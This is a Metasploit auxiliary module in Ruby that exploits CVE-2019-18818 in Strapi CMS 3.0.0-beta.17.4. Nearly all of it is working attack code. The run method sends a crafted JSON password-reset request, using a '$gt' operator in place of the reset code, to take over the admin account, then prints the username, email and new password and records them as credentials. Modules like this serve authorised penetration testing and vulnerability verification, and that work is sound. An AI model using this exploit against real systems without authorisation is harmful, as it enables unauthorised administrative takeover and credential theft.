##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Strapi CMS Unauthenticated Password Reset',
        'Description' => %q{
          This module abuses the mishandling of a password reset request for
          Strapi CMS version 3.0.0-beta.17.4 to change the password of the admin user.

          An admin account must already have an unused pending password-reset token.
          This module does not initiate a password-reset request.

          Successfully tested against Strapi CMS version 3.0.0-beta.17.4.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'WackyH4cker', # original module creation
          'h00die' # lots of fixes, documentation, standardization
        ],
        'References' => [
          [ 'URL', 'https://vulners.com/cve/CVE-2019-18818' ],
          [ 'URL', 'https://github.com/strapi/strapi/releases/tag/v3.0.0-beta.17.4' ],
          [ 'URL', 'https://github.com/strapi/strapi/pull/4443' ],
          [ 'CVE', '2019-18818' ],
          [ 'EDB', '50716' ]
        ],
        'Privileged' => true,
        'DisclosureDate' => '2022-02-09',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS]
        }
      )
    )

    register_options [
      OptString.new('NEW_PASSWORD', [true, 'New Admin password']),
      OptString.new('TARGETURI', [true, 'The base path to strapi', '/'])
    ]
  end

  def check_host(_ip)
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'admin', 'init')
    })
    return Exploit::CheckCode::Unknown('No response from the Strapi initialization endpoint') unless res
    return Exploit::CheckCode::Unknown("Unexpected HTTP status #{res.code} from the initialization endpoint") unless res.code == 200
    return Exploit::CheckCode::Unknown('The initialization endpoint returned no JSON data') if res.body.blank?

    json = res.get_json_document
    data = json['data'] if json.is_a?(Hash)
    version_string = data['strapiVersion'] if data.is_a?(Hash)
    unless version_string.is_a?(String) && version_string.match?(/\A\d+\.\d+\.\d+(?:-beta\.\d+(?:\.\d+)*)?\z/)
      return Exploit::CheckCode::Unknown('The initialization endpoint did not report a valid Strapi version')
    end

    version = Rex::Version.new(version_string)
    if version == Rex::Version.new('3.0.0-beta.17.4')
      return Exploit::CheckCode::Appears("Strapi #{version} is affected; resetting a password requires an unused pending admin reset token")
    end
    return Exploit::CheckCode::Safe("Strapi #{version} includes the password-reset fix") if version >= Rex::Version.new('3.0.0-beta.17.5')

    Exploit::CheckCode::Detected("Strapi #{version} detected; this earlier release has not been verified")
  rescue ArgumentError => e
    elog('Failed to parse the reported Strapi version', error: e)
    Exploit::CheckCode::Unknown('The initialization endpoint reported an invalid Strapi version')
  end

  def run
    password = datastore['NEW_PASSWORD'].to_s.dup.force_encoding(::Encoding::UTF_8)
    unless password.valid_encoding?
      print_error('NEW_PASSWORD must contain valid UTF-8 text')
      return
    end

    # Request bodies are octets; keep Rex's Content-Length byte-accurate.
    json_post_data = JSON.generate({
      'code' => { '$gt' => 0 },
      'password' => password,
      'passwordConfirmation' => password
    }).b

    print_status('Resetting admin password...')
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'admin', 'auth', 'reset-password'),
      'ctype' => 'application/json',
      'data' => json_post_data
    })

    if res.nil?
      print_error('Unable to determine due to a HTTP connection timeout')
      return
    end

    unless res.code == 200
      print_error('Could not change admin user password; verify that an unused reset token is pending')
      return
    end

    json_resp = res.body.blank? ? {} : res.get_json_document
    user = json_resp['user'] if json_resp.is_a?(Hash)
    unless user.is_a?(Hash) && user['username'].is_a?(String) && user['email'].is_a?(String)
      print_error('Unexpected password-reset response; no valid user record was returned')
      return
    end

    print_good('Password changed successfully!')
    print_good("User: #{user['username']}")
    print_good("Email: #{user['email']}")
    print_good("PASSWORD: #{password}")
    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      workspace_id: myworkspace_id,
      service_name: 'strapi cms',
      address: rhost,
      port: rport,
      protocol: 'tcp',
      private_type: :password,
      private_data: password,
      username: user['username']
    }
    create_credential(credential_data)
  end

end
